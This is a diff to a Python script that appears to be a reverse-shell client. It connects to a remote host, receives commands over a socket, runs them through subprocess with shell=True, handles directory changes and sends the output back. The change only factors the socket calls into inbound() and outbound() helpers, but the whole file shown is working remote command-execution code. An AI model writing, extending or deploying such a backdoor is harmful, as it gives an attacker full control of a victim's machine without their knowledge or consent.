@@ -3,6 +3,21 @@ import subprocess
 import os
 import sys
 
+def inbound():
+    print(f'[+] Awaiting response...')
+    message = ""
+    while True:
+        try:
+            message = sock.recv(1024).decode()
+            return message
+        except Exception:
+            sock.close()
+
+def outbound(message):
+    response = str(message).encode()
+    sock.send(response)
+
+
 # Forms connection to server with IP and port
 def session_handler():
     print(f'[+] Connection to {host_ip}.')
@@ -12,7 +27,7 @@ def session_handler():
             # Try/Catch to ensure connection is closed in the case of any errors
             try:
                 # message must be decoded since it is sent in bytes
-                message = sock.recv(1024).decode()
+                message = inbound()
                 # exit message handler
                 if message.lower() == 'exit':
                     print('[+] Connection closed from remote host')
@@ -23,11 +38,11 @@ def session_handler():
                     os.chdir(directory)
                     cur_dir = os.getcwd()
                     print(f'[+] Changed to - {cur_dir}')
-                    sock.send(cur_dir.encode())
+                    outbound(cur_dir)
                 else:
                     command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                     output = command.stdout.read() + command.stderr.read()
-                    sock.send(output)
+                    outbound(output.decode())
 
             except KeyboardInterrupt:
                 print("\n[+] Keyboard Interrupt Issued")
